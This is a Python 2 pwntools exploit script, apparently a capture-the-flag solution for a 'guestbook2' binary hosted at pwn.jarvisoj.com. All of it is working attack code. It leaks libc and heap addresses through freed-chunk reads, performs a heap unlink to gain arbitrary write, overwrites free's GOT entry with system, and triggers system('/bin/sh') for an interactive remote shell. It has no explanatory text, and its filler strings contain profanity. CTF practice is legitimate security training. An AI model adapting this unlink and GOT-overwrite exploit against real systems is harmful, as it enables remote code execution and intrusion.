#!/usr/bin/env python2
from pwn import *

ready = True
if ready:
    conn = remote('pwn.jarvisoj.com', 9879)
else:
    conn = process(['/home/doublesine/Desktop/guestbook2'])

wait_time = 0.2

def Sendline(s):
    conn.sendline(s); print(s)
    sleep(wait_time)

def new_post(length, content):
    Sendline('2')
    print conn.read(),
    Sendline('%d' % length)
    print conn.read(),
    if len(content) != 0:
        conn.send_raw(content); print(repr(content))
        sleep(wait_time)

def edit_post(i, length, content):
    assert(length == len(content))
    Sendline('3')
    print conn.read(),
    Sendline('%d' % i)
    print conn.read(),
    Sendline('%d' % length)
    if len(content) != 0:
        print conn.read(),
        conn.send_raw(content); print(repr(content))
        sleep(wait_time)

def delete_post(i):
    Sendline('4')
    print conn.read(),
    Sendline('%d' % i)

GOT_free_addr = 0x0000000000602018

sleep(wait_time)

# leak libc base address
print conn.read(),
new_post(4, 'fuck')
print conn.read(),
new_post(4, 'fuck')
print conn.read(),
delete_post(0)
print conn.read(),
new_post(8, 'fuckfuck')
print conn.read(),
Sendline('1')
recv = conn.readline()
print repr(recv)
print repr(conn.readline())
# handle return bytes
recv = recv.lstrip('0. fuckfuck').rstrip('\n')
libc_main_arena = unpack(recv + (8 - len(recv)) * '\x00', 64)
libc_base_addr = libc_main_arena - 0x3BE7B8
libc_system_addr = libc_base_addr + 0x46640
libc_binsh_addr = libc_base_addr + 0x17CCDB
log.info('libc_main_arena = 0x%016x' % libc_main_arena)
log.info('libc_base_addr = 0x%016x' % libc_base_addr)
log.info('libc_system_addr = 0x%016x' % libc_system_addr)
log.info('libc_binsh_addr = 0x%016x' % libc_binsh_addr)

# leak PostList address
print conn.read(),
new_post(8, '/bin/sh\x00')
print conn.read(),
new_post(8, '/bin/sh\x00')
print conn.read(),
new_post(8, '/bin/sh\x00')
print conn.read(),
delete_post(3)
print conn.read(),
delete_post(1)
print conn.read(),
new_post(8, 'fuckfuck')
print conn.read(),
new_post(8, 'fuckfuck')
print conn.read(),
Sendline('1')
print repr(conn.readline())
recv = conn.readline(); print repr(recv)
print repr(conn.readline())
print repr(conn.readline())
# handle return bytes
recv = recv.lstrip('1. fuckfuck').rstrip('\n')
Post1_content_chunk_addr = unpack(recv + (8 - len(recv)) * '\x00', 64)
PostList_addr = Post1_content_chunk_addr - 0x18a0
Post0_addr = PostList_addr + 0x10
log.info('Post1_content_chunk_addr = 0x%016x' % Post1_content_chunk_addr)
log.info('PostList_addr = 0x%016x' % PostList_addr)
log.info('Post0_addr = 0x%016x' % Post0_addr)

# prepare unlink
print conn.read(),
delete_post(3)
print conn.read(),
edit_post(0, 0x90, pack(0, 64) + pack(0x81, 64) + pack(Post0_addr + 0x10 - 0x18, 64) + pack(Post0_addr + 0x10 - 0x10, 64) + (0x80 - 8 * 4) * 'A' + 
                   pack(0x80, 64) + pack(0x90 + 0x90, 64))
# unlink
print conn.read(),
delete_post(3)
# let post0 points to GOT.plt.free
print conn.read(),
edit_post(0, 0x90, pack(5, 64) + 
                   pack(1, 64) + pack(8, 64) + pack(GOT_free_addr, 64) + 
                   pack(1, 64) + pack(8, 64) + pack(libc_binsh_addr, 64) + 
                   (0x90 - 7 * 8) * 'A')
# modify free to system
print conn.read(),
edit_post(0, 8, pack(libc_system_addr, 64))
# call free to trigger system('/bin/sh')
print conn.read(),
delete_post(1)
conn.interactive()
